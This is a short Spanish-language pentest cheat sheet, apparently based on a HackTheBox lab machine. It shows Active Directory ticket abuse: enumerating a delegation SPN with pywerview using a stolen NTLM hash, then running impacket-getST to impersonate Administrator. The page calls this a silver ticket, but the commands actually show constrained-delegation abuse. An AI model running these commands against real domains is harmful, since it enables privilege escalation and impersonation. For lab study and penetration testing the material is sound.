# Silver Ticket Attack

Cuando la contraseña de un servicio es comprometida, es posible generar un TGS válido para que un usuario arbitrario se autentique a este servicio.&#x20;



## Explotación

Listar SPN del servicio dado:

```bash
# Con la herramienta pywerview es posible listar mucha información de un servicio 
pywerview get-netcomputer -u 'svc_int$' --hashes '9ee6005cc12d8337df1dc46d481ec7ce:9ee6005cc12d8337df1dc46d481ec7ce' -t 10.10.10.248 --full-data

# Y en el campo msds-allowedtodelegateto se obtiene el SPN
WWW/dc.intelligence.htb
```

Con esto podremos usar impacket para generar un archivo ccache que nos servirá para autenticarnos:

```bash
# Sincronizar reloj local con el del DC
rdate -n 10.10.10.248
ntpdate 10.10.10.248

# Generar el archivo ccache
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :9ee6005cc12d8337df1dc46d481ec7ce
```
